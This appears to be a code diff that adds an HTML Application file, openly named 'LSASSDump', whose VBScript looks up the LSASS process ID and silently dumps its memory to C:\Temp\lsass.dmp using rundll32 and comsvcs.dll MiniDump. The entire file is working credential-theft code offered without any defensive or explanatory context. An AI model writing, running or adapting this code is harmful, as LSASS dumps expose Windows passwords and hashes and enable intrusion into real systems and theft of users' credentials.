@@ -1,0 +1,35 @@
+<html>
+<head>
+  <hta:application id="oHTA"
+    applicationname="LSASSDump"
+    border="thin"
+    borderstyle="normal"
+    caption="yes"
+    showintaskbar="yes"
+    singleinstance="yes"
+    windowstate="minimize" />
+</head>
+<script language="VBScript">
+  Set objShell = CreateObject("WScript.Shell")
+  objShell.Run("cmd.exe /c mkdir C:\Temp"), 0, True
+  objShell.Run("cmd.exe /c rundll32.exe comsvcs.dll, MiniDump " & GetLSASSPID() & " C:\Temp\lsass.dmp full"), 0, True
+
+  Function GetLSASSPID()
+    Dim oExec, output, matches, re
+    Set oExec = CreateObject("WScript.Shell").Exec("cmd.exe /c tasklist | findstr lsass.exe")
+    output = oExec.StdOut.ReadAll
+
+    Set re = New RegExp
+    re.Pattern = "lsass\.exe\s+(\d+)"
+    re.IgnoreCase = True
+
+    If re.Test(output) Then
+      Set matches = re.Execute(output)
+      GetLSASSPID = matches(0).SubMatches(0)
+    Else
+      GetLSASSPID = "0"
+    End If
+  End Function
+</script>
+<body></body>
+</html>
